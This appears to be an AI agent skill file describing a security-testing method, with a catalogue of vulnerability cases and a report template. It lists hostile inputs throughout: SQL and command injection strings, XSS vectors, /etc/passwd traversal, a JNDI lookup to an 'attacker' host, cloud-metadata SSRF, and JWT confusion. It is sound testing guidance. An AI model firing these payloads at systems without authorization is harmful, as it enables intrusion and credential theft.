---
name: cyber
description: For cyber team. Dont load unless asked.
---

# Cyber Security Testing

How to test an app and write up the result. Work a target against the case catalogue below, try to reach a goal (a payload that actually executes in the target's context), then record the outcome as `report-risk.md` or `report-safe.md`.

The loop, in short: **pick a surface → pick cases → fire payloads until one reaches its goal → record evidence → write the report.**

For every input, the defaults are **too long, too short, empty, wrong type, and malicious characters**; for every object, ask **"am I allowed to see/change this?"**.

## The Goal

The cases below are **causes**; by themselves they prove nothing. Testing only matters when a cause becomes an observable **goal**: a harmless payload that actually executes in the target's context.

- **Browser / XSS** — `console.log("Hi!")`
- **Shell / command injection** — `echo "Hi!"`
- **SQL** — `UNION SELECT table_name`
- **Template / expression injection** — `{{7*7}}` (renders `49`)
- **Path traversal** — read a known canary file (`../../etc/passwd`)
- **SSRF** — the server reaches a callback canary you control

A payload that reaches its goal is a confirmed finding and is written up as `report-risk.md`. A payload that never reaches its goal, across every surface and every payload you tried, is written up as `report-safe.md`, with the evidence of what you tried and why it failed.

## Common Vulnerability Cases

### 1. Input validation & boundaries

- **Oversized input** — a 257-char password, 1MB in a "name" field, a 10,000-char URL. Does it truncate gracefully, reject, or overflow a buffer / blow past a length check?
- **Empty and null** — blank field, `null`, `0`, just whitespace. Does "required" logic actually reject them?
- **Boundary values** — exactly at the limit (255), one over (256), one under (254). Off-by-one bugs live here.
- **Numeric extremes** — negative numbers, `0`, very large numbers, floats like `1e309` (infinity), `NaN`. Integer overflow can wrap negative and break quantity/price math.
- **Negative quantities** — order `-5`, transfer `-1000`, return negative items for a refund.
- **Whitespace & control chars** — leading/trailing spaces, tabs, `\n`, `\r\n`, null bytes (`%00` / `\x00`) to terminate strings early.
- **Unicode / multibyte** — emoji, right-to-left override, combining marks, homoglyphs (lookalike letters) to spoof usernames or bypass filters.
- **Duplicate / repeated data** — double-submitting, resending a request, submitting the same unique field twice.

### 2. Injection & escape characters

- **SQL injection** — `'`, `;`, `--`, `/* */`, `' OR '1'='1`, `PAYLOAD_HERE`. Test every field that reaches a database.
- **Closing sentinels** — `';`, `')`, `";`, `}`, `]]>`, `</script>`. Anything that closes a quote/bracket and appends more.
- **Command injection** — `;`, `&&`, `||`, `|`, backtick `` ` ``, `$()`, newline-separated commands in anything that reaches a shell or exec call.
- **XSS** — `<script>`, `<img onerror=...>`, `javascript:` URLs, event handlers (`onload`, `onmouseover`). Test anywhere input is echoed into a page.
- **Path traversal** — `../`, `..\`, `../../etc/passwd`, absolute paths, encoded variants (`%2e%2e%2f`). Watch file upload/download/read features.
- **Header/CRLF injection** — `\r\n` in any value that ends up in an HTTP header (redirect URL, filename).
- **Template injection** — `{{ }}`, `${}`, `<%= %>` where a templating engine touches user input.
- **XML/XXE** — doctype and external entity declarations if XML is parsed.

### 3. Encoding tricks

- **Double encoding** — `%2527` (→ `%27` → `'`). Bypasses single-layer decoders.
- **Mixed encodings** — encode some chars and not others, alternate case (`%2f` vs `%2F`), Unicode normalization to `/` or `'`.
- **Base64 / hex / escaped** — `\x27`, `\u0027`, or base64-wrapped input; test what happens after decoding.

### 4. Authentication & sessions

- **Password policy edges** — max length, min length, complexity, leading/trailing spaces, unicode passwords.
- **Brute force / rate limiting** — hammer login, OTP, or reset endpoints; is there throttling or lockout?
- **Lockout abuse** — can a lockout DoS a victim's account? Does the lockout message leak account existence?
- **Session handling** — fixation (does login reuse an old session ID?), expiry, logout actually invalidating, cookies missing `HttpOnly` / `Secure` / `SameSite`.
- **Password reset flow** — predictable tokens, tokens that don't expire, reset that logs you in without re-auth, guessable "security questions".

### 5. Authorization

- **IDOR** — change `?id=1234` to `?id=1235` and see if you can read/edit someone else's record.
- **Privilege escalation** — a normal user hitting an admin endpoint, or changing `role=user` to `role=admin` in a request.
- **Missing function-level checks** — API endpoints, hidden pages, or internal-only routes that don't verify permissions.

### 6. Error handling & info disclosure

- **Verbose errors** — stack traces, SQL queries, file paths, framework versions leaking in error messages.
- **Timing attacks** — measurable response differences revealing user existence or password-prefix correctness.
- **Default/leftover content** — debug mode on, admin/test accounts, default creds, exposed `.git`, `robots.txt` paths, backup files (`.bak`, `~`).

### 7. File uploads

- **Type bypass** — `shell.php` → `shell.php.jpg`, spoofed MIME, magic bytes, double extension.
- **Size limits** — huge files, zip bombs to exhaust disk/memory.
- **Malicious content** — polyglot files, embedded scripts, SVG with XSS.

### 8. Logic & business rules

- **Race conditions** — two "withdraw"/"apply coupon" requests at once; spend the same balance twice.
- **Order of operations** — discount after tax, stack a coupon multiple times.
- **Workflow skipping** — jump to checkout step 3, or approve your own request.
- **Negative / zero-price** — manipulate quantity or price to get $0 or negative totals.

### 9. Fail-open / error-code mishandling

The app *does* reject bad input, but on error it accidentally lets you through.

- **Error treated as success** — a failure return value is accepted as a pass. A password over 256 bytes makes `crypt()` return `*` (its error marker), which a passwordless account also stores, so the two match and login succeeds.

### 10. Memory safety / bounds in native code

- **Unchecked length** — a client-supplied size is trusted without validation, so a read or write runs past the buffer. A heartbeat that claims 64KB but carries 1 byte makes the responder read 64KB of adjacent memory.

### 11. Race conditions / TOCTOU

- **Check-then-act gap** — the check and the action it gates are not atomic, so state changes in between. Two withdrawals both pass the "has funds" check before either debit lands, spending the balance twice.

### 12. Cryptography & randomness

- **Predictable randomness or hardcoded keys** — a key, IV, or token comes from a weak source or is fixed in code. A session token drawn from a seeded `rand()` can be guessed ahead of time.
- **Nonce reuse ("two-time pad")** — the same nonce/IV for two messages reuses the keystream, so `C1 XOR C2 = P1 XOR P2`; with one known plaintext you recover the keystream and decrypt the rest. Reusing an AES-GCM nonce leaks the authentication key, enabling forged messages.

### 13. Deserialization / expression-language / templates

- **Untrusted data evaluated** — data reaches a serializer, expression language, or template that evaluates it. A log line of `${jndi:ldap://attacker/}` makes the logger look up a remote address.

### 14. SSRF (server-side request forgery)

- **Server fetches attacker URL** — a feature lets the server request a URL the client controls, reaching internal services. An image-import endpoint pointed at `http://169.254.169.254/latest/meta-data/` returns the instance's cloud credentials.

### 15. Server-side path / URL parsing

- **Path normalization bypass** — the server resolves a request path without collapsing encoded traversal. `GET /%2e%2e/%2e%2e/etc/passwd` escapes the document root and returns a system file.

### 16. Supply chain / dependencies

- **Untrusted dependency** — a library or its build step comes from a source you don't control. A dependency pinned to `@main` or `@latest` runs whatever that ref points to today, including an attacker's republished version.

### 17. Language-runtime quirks (prototype pollution)

- **Polluted prototype** — a merge or assign treats `__proto__` as a writable key, changing every object of that type. Deep-merging a request body that holds `{"__proto__": {"polluted": true}}` pollutes the base object globally.

### 18. Signature / token confusion

- **Trusted token header** — the algorithm field in a token's header is believed without verification. A JWT whose header says `alg: none` is accepted with no signature, or `RS256` swapped to `HS256` reuses the public key as the HMAC secret.

### 19. Timing / information oracle

- **Response-time oracle** — a measurable timing or size difference reveals hidden state. A login that answers faster for a nonexistent username than a real one lets an attacker enumerate accounts.

---

## Core principle

Don't only test the happy path "rejects bad input." Test what happens when the **machinery itself** errors, races, mis-parses, or trusts a length/flag/algo field it didn't fully validate. The SSHole bug is the poster child; there is no exotic injection, just an error code colliding with a sentinel value.

---

## Reporting

A test ends in exactly one file: `report-risk.md` or `report-safe.md`. Same shape, opposite verdict.

- **`report-risk.md`** — a goal was reached (a payload executed). Confirmed finding.
- **`report-safe.md`** — no goal was reached across every surface and payload tried. Absence of proof, with the evidence for it.

Number each finding `SB-###` (sequential) and give it a short nickname. The report title is `SB-### ("nickname") — <component / target>`.

The verdict is the first thing a reader sees, and it stands or falls on **independent lines of evidence**, not one. Aim for at least two or three that don't share an assumption.

### Building the evidence

- **One line = one independent reason.** If two lines both fail when a single assumption fails, they are one line. "Runtime mismatch," "no reachable code path," and "the decoder behaves like the patched build" are three because killing any one leaves the other two standing.
- **Code plus live.** Static reading says a path *should* behave; a probe shows it *does*. Record both, and give the probe a table of payloads with the result and the post-probe state each left.
- **The goal is the pass/fail.** A `report-risk.md` shows the payload that reached its goal and what it returned. A `report-safe.md` shows each payload that failed and why (identical to control, clean error, no crash).
- **Record what you didn't do.** Footnotes are where untested vectors and scope limits live, so the verdict isn't read as broader than it is.

### Template

```markdown
# <SB-### ("nickname")> — <component / target>

- **Date:** YYYY-MM-DD
- **Target:** <host:port>, <runtime / framework>, version <x.y.z>

## Verdict

**<one bold sentence: vulnerable / not amongst the vulnerable>.** <remediation, or "no remediation required", scoped to the surface tested>

<Number> independent lines of evidence:

### 1. <line of evidence>

### 2. <line of evidence>

### 3. <line of evidence>

## Footnotes

- <assumptions, scope limits, anything that would change the verdict>

## Files

| File | What it is |
|---|---|
| `report-safe.md` (or `report-risk.md`) | This report |
| `<payload / probe artifacts>` | <what each one is> |

**Rerun:** <the command(s) that reproduce the result>
```
